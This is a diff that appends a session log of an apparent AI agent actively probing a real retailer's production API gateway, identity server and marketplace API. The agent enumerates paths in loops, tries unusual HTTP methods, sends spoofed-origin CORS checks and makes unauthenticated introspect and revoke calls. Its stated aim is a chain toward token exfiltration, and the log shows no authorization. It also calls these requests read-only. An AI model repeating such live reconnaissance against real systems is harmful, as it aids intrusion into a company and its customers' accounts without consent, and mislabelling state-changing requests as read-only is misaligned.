@@ -6749,3 +6749,1258 @@ testability: AUTH_HELPED
 [RISK] hornbach: 50/100 — token-plane no-auth introspection+revocation re-confirmed live on the correct POST shape this session, resolving the KB's persistent 404/200 contradiction and strengthening it as the single most defensible systemic finding (RFC 7662/7009); token issuance correctly gated (isolates the flaw to the management plane); HS256/RS256 dual-alg in metadata flags a JWT confusion candidate but is unproven; SCIM provisioning 401-gated controllers confirmed; all impact-chain content (real-token exfil, silent revoke) still gated on client_id+token acquisition; no anonymous PII reachable; critical path remains client_id extraction.
 
 I did not modify any files — this was a purely analytical pass with read-only probes. The key new contribution this session: I resolved the standing "introspect/revoke 404 vs 200" contradiction in the KB. It is the **HTTP method** — GET→404, POST→200 unauthenticated. This strengthens confidence in the systemic token-plane bypass (now 75, on the POST shape) rather than the "transient routing" explanation the KB had been fragmenting over.
+===== ANALYST bigpickle 2026-09-05 12:18:39 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m• [0mRead current workspace files[90m Explore Agent[0m
+[0m✓ [0mRead current workspace files[90m Explore Agent[0m
+[0m• [0mRead inventory and leads[90m Explore Agent[0m
+[0m✓ [0mRead inventory and leads[90m Explore Agent[0m
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' -X POST 'https://api.hornbach.de/graphql' -H 'Content-Type: application/json' -d '{"query":"{__schema{name}}"}' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/actuator' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/health' 2>/dev/null
+404
+[0m
+Now let me run the actual live probes to update the surface before producing my analysis:
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/api-docs' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/swagger-ui.html' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/sap/public/ping' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/sap/bc/odata' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/sap/opu/odata' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/actuator/health' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/actuator/gateway/routes' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/v3/api-docs' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' 'https://api.hornbach.de/openapi.json' 2>/dev/null
+404
+[0m
+[0m$ [0mcurl -s -o /dev/null -w '%{http_code}' -X POST 'https://api.hornbach.de/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -d '{"query":"{ __schema { types { name } } }"}' 2>/dev/null
+404
+[0m
+[0m$ [0m# Re-confirm token plane status
+echo "--- introspect POST ---"
+curl -s -w '\nHTTP_CODE:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/introspect' -H 'Content-Type: application/x-www-form-urlencoded' -d 'token=fake' 2>/dev/null
+echo ""
+echo "--- revoke POST ---"
+curl -s -w '\nHTTP_CODE:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/revoke' -H 'Content-Type: application/x-www-form-urlencoded' -d 'token=fake' 2>/dev/null
+echo ""
+--- introspect POST ---
+{"active":false}
+HTTP_CODE:200
+--- revoke POST ---
+OK
+HTTP_CODE:200
+[0m
+[0m$ [0m# Check api.hornbach.de response headers and body for a known 404
+curl -s -D - 'https://api.hornbach.de/' 2>/dev/null | head -50
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:08:02 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-22069c6ab90ba9dffd5287f4 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# Check if login-srv/social/token still leaks CORS + 500
+curl -s -D - 'https://auth.hornbach.com/login-srv/social/token' 2>/dev/null | head -30
+HTTP/2 500 
+date: Sat, 05 Sep 2026 12:08:04 GMT
+content-type: application/json; charset=utf-8
+content-length: 41
+access-control-allow-origin: *
+etag: W/"29-3rekA97WHU/ns5EjebSJYlEQPOM"
+strict-transport-security: max-age=15724800; includeSubDomains
+x-cidaas-ref-number: cc7cb5ac-09f2-4db7-91f6-f5e0f162f2c9
+x-ref-number: cc7cb5ac-09f2-4db7-91f6-f5e0f162f2c9
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=NpES4s6iTo0l.aR0XXzo004N6NbJUXGyh8J1pJvwPrM-1788610084.9192476-1.0.1.1-U8y98AjMBSpFXJ3nuCr43CLvWxHxD.WEwlGZrW_5TkMIoHcK2qqOGk3FVCjN4N266U7BXCPnNN7d9yrOpYaZS0WQzBSsXWLwYskN8w5cPHIJ3f3s75VfVu_Y_OSh4qBG; HttpOnly; SameSite=None; Secure; Path=/; Domain=auth.hornbach.com; Expires=Sat, 05 Sep 2026 12:38:04 GMT
+server: cloudflare
+cf-ray: a3651e06b8146305-HAM
+alt-svc: h3=":443"; ma=86400
+
+{"success":false,"status":500,"error":{}}
+[0m
+[0m$ [0m# Check SCIM endpoints
+echo "--- /v2/Users ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://auth.hornbach.com/user-scim-srv/v2/Users' 2>/dev/null
+echo ""
+echo "--- /v2/Schemas ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://auth.hornbach.com/user-scim-srv/v2/Schemas' 2>/dev/null
+echo ""
+--- /v2/Users ---
+{"success":false,"status":401,"error":"Unauthorized","code":"401"}
+HTTP:401
+--- /v2/Schemas ---
+{"success":false,"status":401,"error":"Unauthorized","code":"401"}
+HTTP:401
+[0m
+[0m$ [0m# Try some more SAP-specific paths and common retail/e-commerce API paths
+for path in /api/v1 /api/v2 /api/1.0 /rest /odata/v1 /sap/hierarchyservice /sap/zapi /b2c /b2b /checkout /cart /catalog /products /stores /stores/v1 /storefinder; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://api.hornbach.de${path}" 2>/dev/null)
+  echo "${path}: ${code}"
+done
+/api/v1: 404
+/api/v2: 404
+/api/1.0: 404
+/rest: 404
+/odata/v1: 404
+/sap/hierarchyservice: 404
+/sap/zapi: 404
+/b2c: 404
+/b2b: 404
+/checkout: 404
+/cart: 404
+/catalog: 404
+/products: 404
+/stores: 404
+/stores/v1: 404
+/storefinder: 404
+[0m
+[0m$ [0m# OPTIONS on api.hornbach.de to check CORS policy
+curl -s -D - -X OPTIONS 'https://api.hornbach.de/' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' 2>/dev/null | head -30
+HTTP/1.1 200 OK
+Date: Sat, 05 Sep 2026 12:08:20 GMT
+Allow: CONNECT, DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT, TRACE
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-34069c6a2206ceba3820db8f 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# POST to api.hornbach.de root + common SAP paths to check POST handling
+echo "--- POST / ---"
+curl -s -D - -X POST 'https://api.hornbach.de/' -H 'Content-Type: application/json' -d '{}' 2>/dev/null | head -20
+echo ""
+echo "--- POST /graphql ---"
+curl -s -D - -X POST 'https://api.hornbach.de/graphql' -H 'Content-Type: application/json' -d '{"query":"{ __typename }"}' 2>/dev/null | head -20
+--- POST / ---
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:08:22 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-36069c6a3806852e6d0c92ee 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+--- POST /graphql ---
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:08:22 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-36069c6a420692613f4dc183 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# auth.hornbach.de - check Citrix NetScaler
+curl -s -D - 'https://auth.hornbach.de/' 2>/dev/null | head -30
+HTTP/1.1 302 Object Moved
+Location: /logon/LogonPoint/tmindex.html
+Strict-Transport-Security: max-age=157680000
+Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self'; img-src http://localhost:* 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; frame-src 'self'; child-src 'self' com.citrix.agmacepa://* citrixng://* com.citrix.nsgclient://* vmware-view:// nsgcepa://nsgcepa application://*; form-action  'self'; object-src 'none'; base-uri 'self'; report-uri /nscsp_violation/report_uri
+Set-Cookie: NSC_DLGE=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
+Set-Cookie: NSC_USER=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
+Set-Cookie: NSC_CERT=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
+Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
+Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT;Secure
+Set-Cookie: NSC_TEMP=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
+Set-Cookie: NSC_PERS=xyz;Path=/;expires=Wednesday, 09-Nov-1999 23:12:40 GMT
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Connection: close
+Content-Length: 413
+Cache-control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html; charset=utf-8
+
+<html><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8"><script type="text/javascript" src="/vpn/resources.js"></script><script type="text/javascript" src="/vpn/init/redirection_body_resources.js"></script></head><body><span id="This object may be found "></span><a href="/logon/LogonPoint/tmindex.html"><span id="here"></span></a><span id="Trailing phrase after here"></span></body></html>
+[0m
+[0m$ [0m# Check .well-known endpoints on api.hornbach.de
+for path in /.well-known/openid-configuration /.well-known/oauth-authorization-server /api/.well-known/openapi /api/openapi.json /api/swagger.json /api-docs/swagger.json; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://api.hornbach.de${path}" 2>/dev/null)
+  echo "${path}: ${code}"
+done
+/.well-known/openid-configuration: 404
+/.well-known/oauth-authorization-server: 404
+/api/.well-known/openapi: 404
+/api/openapi.json: 404
+/api/swagger.json: 404
+/api-docs/swagger.json: 404
+[0m
+[0m$ [0m# Hornbach Mirakl - check some more paths
+for path in /api/1 /api/2 /api/3 /api/v3.1301 /api/catalog/products /api/orders /api/listings /api/accounts /api/payments /api/feeds /api/configurations /api/categories /api/attributes; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://hornbach-mp.mirakl.net${path}" 2>/dev/null)
+  if [ "$code" != "404" ]; then
+    echo "HIT: ${path}: ${code}"
+  fi
+done
+echo "done"
+HIT: /api/1: 401
+HIT: /api/2: 401
+HIT: /api/3: 401
+HIT: /api/v3.1301: 401
+HIT: /api/catalog/products: 401
+HIT: /api/orders: 401
+HIT: /api/listings: 401
+HIT: /api/accounts: 401
+HIT: /api/payments: 401
+HIT: /api/feeds: 401
+HIT: /api/configurations: 401
+HIT: /api/categories: 401
+HIT: /api/attributes: 401
+done
+[0m
+[0m$ [0m# Try more API paths - German/retail specific
+for path in /api/shop /api/store /api/market /api/user /api/auth /api/token /api/product /api/search /api/config /api/version /api/health /api/info /api/status /metrics /prometheus; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://api.hornbach.de${path}" 2>/dev/null)
+  if [ "$code" != "404" ]; then
+    echo "HIT: ${path}: ${code}"
+  fi
+done
+echo "done"
+done
+[0m
+[0m$ [0m# Verify Mirakl 401s are real routes vs catch-all
+echo "--- /api/catalog/products ---"
+curl -s -D - 'https://hornbach-mp.mirakl.net/api/catalog/products' 2>/dev/null | head -20
+echo ""
+echo "--- /api/orders ---"
+curl -s -D - 'https://hornbach-mp.mirakl.net/api/orders' 2>/dev/null | head -20
+--- /api/catalog/products ---
+HTTP/2 401 
+date: Sat, 05 Sep 2026 12:08:48 GMT
+content-type: application/json
+content-length: 39
+cache-control: no-cache, no-store, max-age=0, must-revalidate
+expires: 0
+original-username: -
+pragma: no-cache
+strict-transport-security: max-age=31536000 ; includeSubDomains
+x-content-type-options: nosniff
+x-correlation-id: 89809592-1f0c-4221-bf8a-3051e4459ea7
+x-frame-options: DENY
+x-xss-protection: 0
+via: 1.1 google
+cf-cache-status: DYNAMIC
+nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=%2F0n9xtYdlAvimUr7iZlwildiactCDxV5EZLyyzJ0gQeOuYfNKemFYGgrpTvDbi8lbAsy2%2FNr3fDh0K3NZJnJT3ztAW2Brf5QZ5TT9e3YB4t2Zo4l17U0ACwJUX86vVMKhkcFlc6K%2F1A%3D"}]}
+server: cloudflare
+cf-ray: a3651f146ab861c5-ORD
+
+
+--- /api/orders ---
+HTTP/2 401 
+date: Sat, 05 Sep 2026 12:08:48 GMT
+content-type: application/json
+content-length: 39
+cache-control: no-cache, no-store, max-age=0, must-revalidate
+expires: 0
+original-username: -
+pragma: no-cache
+strict-transport-security: max-age=31536000 ; includeSubDomains
+x-content-type-options: nosniff
+x-correlation-id: 89a41b4a-35bc-472d-8db5-0e45ad031267
+x-frame-options: DENY
+x-xss-protection: 0
+via: 1.1 google
+cf-cache-status: DYNAMIC
+nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=veDG80ho%2BJqOv7PzOp1QrT8Yesaidhd5Ty%2BCDYdtv1cWz2pcWNlfI4cPwXSLhnqX%2FVOfNf0HHAwNOD%2FCjS7%2BGz1xu%2Bw7EFTMIIvQYC29sX5fi2MVoK44nRbV0zOk8w74s3o2sc%2FZINo%3D"}]}
+server: cloudflare
+cf-ray: a3651f15a9416206-ORD
+[0m
+[0m$ [0m# Check api.hornbach.de OPTIONS Allow header more carefully — TRACE is a big deal
+curl -s -D - -X OPTIONS 'https://api.hornbach.de/graphql' -H 'Origin: https://evil.com' -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: Content-Type' 2>/dev/null | head -30
+HTTP/1.1 200 OK
+Date: Sat, 05 Sep 2026 12:08:48 GMT
+Allow: CONNECT, DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT, TRACE
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-50069c6a300ae8d728fa931b 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# api.hornbach.de: TRACE method test
+curl -s -D - -X TRACE 'https://api.hornbach.de/' 2>/dev/null | head -20
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:08:48 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-50069c6a410ae6f7ed3be1b0 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# Check api.hornbach.de for Via header and internal hostname
+curl -s -D - 'https://api.hornbach.de/' 2>/dev/null | grep -i -E '(via|x-internal|x-forward|server|x-powered|x-backend)' 
+Server: Gateway
+[0m
+[0m$ [0m# Get actual body of Mirakl 401
+curl -s 'https://hornbach-mp.mirakl.net/api/catalog/products' 2>/dev/null
+echo ""
+curl -s 'https://hornbach-mp.mirakl.net/api/orders' 2>/dev/null
+echo ""
+curl -s 'https://hornbach-mp.mirakl.net/api/accounts' 2>/dev/null
+{"message":"Unauthorized","status":401}
+{"message":"Unauthorized","status":401}
+{"message":"Unauthorized","status":401}
+[0m
+[0m$ [0m# api.hornbach.de: try CONNECT method (listed in Allow)
+curl -s -D - -X CONNECT 'https://api.hornbach.de/' 2>/dev/null | head -15
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:09:02 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-5e069c6a050d847eef67c909 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# api.hornbach.de: try PATCH/PUT methods on root
+curl -s -D - -X PATCH 'https://api.hornbach.de/' -H 'Content-Type: application/json' -d '{}' 2>/dev/null | head -15
+echo "---"
+curl -s -D - -X PUT 'https://api.hornbach.de/' -H 'Content-Type: application/json' -d '{}' 2>/dev/null | head -15
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:09:05 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-61069c6a41168e07b58011ab 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}---
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:09:04 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-60069c6a710d38a3da85a63c 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# api.hornbach.de: try DELETE
+curl -s -D - -X DELETE 'https://api.hornbach.de/' 2>/dev/null | head -15
+HTTP/1.1 404 Not Found
+Date: Sat, 05 Sep 2026 12:09:05 GMT
+Server: Gateway
+Connection: close
+X-CorrelationID: Id-61069c6a800d332b92a15e52 0
+Accept: */*
+Host: api.hornbach.de
+User-Agent: curl/8.5.0
+Content-Type: application/json
+
+{"message":{"status":"404","text":"Not Found"}}
+[0m
+[0m$ [0m# Fetch full OIDC metadata to enumerate all service endpoints fresh
+curl -s 'https://auth.hornbach.com/.well-known/openid-configuration' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -120
+{
+    "issuer": "https://auth.hornbach.com",
+    "authorization_endpoint": "https://auth.hornbach.com/authz-srv/authz",
+    "token_endpoint": "https://auth.hornbach.com/token-srv/token",
+    "userinfo_endpoint": "https://auth.hornbach.com/users-srv/userinfo",
+    "https://discovery.netid.de/properties/status_endpoint": "https://auth.hornbach.com/.well-known/status",
+    "jwks_uri": "https://auth.hornbach.com/.well-known/jwks.json",
+    "scopes_supported": [
+        "openid",
+        "profile",
+        "email",
+        "phone",
+        "address",
+        "offline_access",
+        "identities",
+        "roles",
+        "groups"
+    ],
+    "response_types_supported": [
+        "code",
+        "token",
+        "id_token",
+        "code token",
+        "code id_token",
+        "token id_token",
+        "code token id_token"
+    ],
+    "response_modes_supported": [
+        "query",
+        "fragment",
+        "form_post"
+    ],
+    "subject_types_supported": [
+        "public"
+    ],
+    "id_token_signing_alg_values_supported": [
+        "HS256",
+        "RS256"
+    ],
+    "token_endpoint_auth_methods_supported": [
+        "client_secret_basic",
+        "client_secret_post",
+        "client_secret_jwt",
+        "private_key_jwt"
+    ],
+    "claims_supported": [
+        "aud",
+        "auth_time",
+        "created_at",
+        "email",
+        "email_verified",
+        "exp",
+        "family_name",
+        "given_name",
+        "iat",
+        "identities",
+        "iss",
+        "mobile_number",
+        "name",
+        "nickname",
+        "phone_number",
+        "picture",
+        "sub"
+    ],
+    "token_endpoint_auth_signing_alg_values_supported": [
+        "HS256",
+        "RS256"
+    ],
+    "check_session_iframe": "https://auth.hornbach.com/session/check_session",
+    "end_session_endpoint": "https://auth.hornbach.com/session/end_session",
+    "social_provider_token_resolver_endpoint": "https://auth.hornbach.com/login-srv/social/token",
+    "registration_endpoint": "https://auth.hornbach.com/apps-srv/clients/register",
+    "userinfo_signing_alg_values_supported": [
+        "HS256",
+        "RS256"
+    ],
+    "userinfo_encryption_alg_values_supported": [
+        "RS256"
+    ],
+    "userinfo_encryption_enc_values_supported": [
+        "A128CBC-HS256"
+    ],
+    "id_token_encryption_alg_values_supported": [
+        "RS256"
+    ],
+    "id_token_encryption_enc_values_supported": [
+        "A128CBC-HS256"
+    ],
+    "display_values_supported": [
+        "page",
+        "popup"
+    ],
+    "claim_types_supported": [
+        "normal"
+    ],
+    "service_documentation": "https://docs.cidaas.de/",
+    "ui_locales_supported": [
+        "en-US",
+        "de-DE"
+    ],
+    "introspection_endpoint": "https://auth.hornbach.com/token-srv/introspect",
+    "introspection_async_update_endpoint": "https://auth.hornbach.com/token-srv/introspect/async/tokenusage",
+    "revocation_endpoint": "https://auth.hornbach.com/token-srv/revoke",
+    "introspection_endpoint_auth_methods_supported": [
+        "client_secret_basic",
+        "client_secret_post",
+        "client_secret_jwt",
+        "private_key_jwt"
+    ],
+    "introspection_endpoint_auth_signing_alg_values_supported": [
+        "HS256",
+        "RS256"
+    ],
+    "revocation_endpoint_auth_methods_supported": [
+        "client_secret_basic",
+        "client_secret_post",
+        "client_secret_jwt",
+        "private_key_jwt"
+    ],
+    "revocation_endpoint_auth_signing_alg_values_supported": [
+[0m
+[0m$ [0mcurl -s 'https://auth.hornbach.com/.well-known/openid-configuration' 2>/dev/null | python3 -m json.tool 2>/dev/null | tail -60
+"id_token_encryption_enc_values_supported": [
+        "A128CBC-HS256"
+    ],
+    "display_values_supported": [
+        "page",
+        "popup"
+    ],
+    "claim_types_supported": [
+        "normal"
+    ],
+    "service_documentation": "https://docs.cidaas.de/",
+    "ui_locales_supported": [
+        "en-US",
+        "de-DE"
+    ],
+    "introspection_endpoint": "https://auth.hornbach.com/token-srv/introspect",
+    "introspection_async_update_endpoint": "https://auth.hornbach.com/token-srv/introspect/async/tokenusage",
+    "revocation_endpoint": "https://auth.hornbach.com/token-srv/revoke",
+    "introspection_endpoint_auth_methods_supported": [
+        "client_secret_basic",
+        "client_secret_post",
+        "client_secret_jwt",
+        "private_key_jwt"
+    ],
+    "introspection_endpoint_auth_signing_alg_values_supported": [
+        "HS256",
+        "RS256"
+    ],
+    "revocation_endpoint_auth_methods_supported": [
+        "client_secret_basic",
+        "client_secret_post",
+        "client_secret_jwt",
+        "private_key_jwt"
+    ],
+    "revocation_endpoint_auth_signing_alg_values_supported": [
+        "HS256",
+        "RS256"
+    ],
+    "claims_locales_supported": [
+        "en-US"
+    ],
+    "op_policy_uri": "https://www.cidaas.com/privacy-policy/",
+    "op_tos_uri": "https://www.cidaas.com/terms-of-use/",
+    "grant_types_supported": [
+        "implicit",
+        "authorization_code",
+        "refresh_token",
+        "password",
+        "client_credentials",
+        "urn:ietf:params:oauth:grant-type:token-exchange",
+        "urn:ietf:params:oauth:grant-type:device_code"
+    ],
+    "code_challenge_methods_supported": [
+        "plain",
+        "S256"
+    ],
+    "device_authorization_endpoint": "https://auth.hornbach.com/authz-srv/device/authz",
+    "backchannel_logout_supported": true,
+    "scim_endpoint": "https://auth.hornbach.com/user-scim-srv/v2"
+}
+[0m
+[0m$ [0m# Probe session management and userinfo endpoints
+echo "--- /session/check_session ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://auth.hornbach.com/session/check_session' 2>/dev/null | head -20
+echo ""
+echo "--- /session/end_session ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://auth.hornbach.com/session/end_session' 2>/dev/null | head -20
+echo ""
+echo "--- /users-srv/userinfo ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://auth.hornbach.com/users-srv/userinfo' 2>/dev/null | head -20
+--- /session/check_session ---
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Check Session Iframe</title>
+    <script>
+        /* A JavaScript implementation of the SHA family of hashes, as defined in FIPS PUB 180-4 and FIPS PUB 202, as well as the corresponding HMAC implementation as defined in FIPS PUB 198a. Copyright Brian Turek 2008-2017 Distributed under the BSD License See http://caligatio.github.com/jsSHA/ for more information Several functions taken from Paul Johnston */
+        'use strict';
+        (function (I) {
+            function w(c, a, d) {
+                let l = 0,
+                    b = [],
+                    g = 0,
+                    f, n, k, e, h, q, y, p, m = !1,
+                    t = [],
+                    r = [],
+                    u, z = !1;
+                d = d || {};
+                f = d.encoding || "UTF8";
+                u = d.numRounds || 1;
+
+--- /session/end_session ---
+
+HTTP:302
+--- /users-srv/userinfo ---
+{"success":false,"status":401,"error":"Unauthorized","code":"401"}
+HTTP:401
+[0m
+[0m$ [0m# Check token issuance requires client auth (isolation of finding)
+echo "--- token-srv/token no auth ---"
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/token' -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials' 2>/dev/null | head -20
+echo ""
+echo "--- token-srv/token password grant no client ---"
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/token' -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=password&username=a@b.c&password=x' 2>/dev/null | head -20
+--- token-srv/token no auth ---
+{"code":"","error":"invalid_client","error_description":"client authentication failed : unknown client"}
+HTTP:400
+--- token-srv/token password grant no client ---
+{"code":"","error":"invalid_client","error_description":"client authentication failed : unknown client"}
+HTTP:400
+[0m
+[0m$ [0m# Device authorization endpoint - check anonymous behavior
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/authz-srv/device/authz' -H 'Content-Type: application/x-www-form-urlencoded' -d 'client_id=test&scope=openid' 2>/dev/null | head -20
+{"error":"invalid_client","error_code":"AUTH10007","error_description":"invalid_client: invalid client_id passed","error_hint":"please check if you passing correct client_id or the client is disabled or deleted"}
+HTTP:400
+[0m
+[0m$ [0m# Check Mirakl with dummy Authorization to see key validation
+echo "--- no auth ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://hornbach-mp.mirakl.net/api/catalog/products' 2>/dev/null
+echo ""
+echo "--- dummy auth header ---"
+curl -s -w '\nHTTP:%{http_code}' 'https://hornbach-mp.mirakl.net/api/catalog/products' -H 'Authorization: dummy-key' 2>/dev/null
+--- no auth ---
+{"message":"Unauthorized","status":401}
+HTTP:401
+--- dummy auth header ---
+{"status":401,"message":"Unauthorized"}
+HTTP:401
+[0m
+[0m$ [0m# Probe api.hornbach.de with SAP-style deep paths and query
+for path in /sap/bc/soap /sap/public/info /sap/public/ping /sap/ping /sap/health /sap/v2 /api/healthcheck /healthz /readyz /livez /status /info /ping /version /favicon.ico /robots.txt; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' "https://api.hornbach.de${path}" 2>/dev/null)
+  if [ "$code" != "404" ]; then
+    echo "HIT: ${path}: ${code}"
+  fi
+done
+echo "scan-complete"
+scan-complete
+[0m
+[0m$ [0m# Check hornbach.de JS/HTML for cidaas client_id hints (non-destructive, just fetch)
+curl -s 'https://www.hornbach.de/customer' 2>/dev/null | head -c 2000
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self'; img-src 'self' data:; media-src 'self' data:; object-src 'none'; style-src 'self' 'sha256-o4vzfmmUENEg4chMjjRP9EuW9ucGnGIGVdbl8d0SHQQ='; script-src 'self' 'sha256-a9bHdQGvRzDwDVzx8m+Rzw+0FHZad8L0zjtBwkxOIz4=';"
+    />
+    <link
+      href="/_fs-ch-1T1wmsGaOgGaSxcX/assets/inter-var.woff2"
+      rel="preload"
+      as="font"
+      type="font/woff2"
+      crossorigin
+    />
+    <link href="/_fs-ch-1T1wmsGaOgGaSxcX/assets/styles.css" rel="stylesheet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Client Challenge</title>
+    <style>
+      #loading-error {
+        font-size: 16px;
+        font-family: 'Inter', sans-serif;
+        margin-top: 10px;
+        margin-left: 10px;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <noscript>
+      <div class="noscript-container">
+        <div class="noscript-content">
+          <img
+            src="/_fs-ch-1T1wmsGaOgGaSxcX/assets/errorIcon.svg"
+            alt=""
+            role="presentation"
+            class="error-icon"
+          />
+          <span class="noscript-span"
+            >JavaScript is disabled in your browser.</span
+          >
+          <p>Please enable JavaScript to proceed.</p>
+        </div>
+      </div>
+    </noscript>
+    <div id="loading-error" role="alert" aria-live="polite">
+      A required part of this site couldn’t load. This may be due to a browser
+      extension, network issues, or browser settings. Please check your
+      connection, disable any ad blockers, or try using a different browser.
+    </div>
+    <script>
+      function loadScript(src) {
+        return new Promise((resolve, reject) => {
+          const script = document.createElement('script');
+          script.onload = resolve;
+          script.onerror = (event) => {
+            console.error('Script load error event:', event);
+            documen
+[0m
+[0m$ [0m# HORNBACH uses SAP Commerce (hybris) - try /occ/ OCC endpoints on www.hornbach.de
+for path in /occ/v2 /rest/v2 /electronics/occ/v2 /storefront /ycommercewebservices /occ/v2/hornbach/ /medias /search; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' -A 'Mozilla/5.0' "https://www.hornbach.de${path}" 2>/dev/null)
+  echo "${path}: ${code}"
+done
+/occ/v2: 200
+/rest/v2: 200
+/electronics/occ/v2: 200
+/storefront: 200
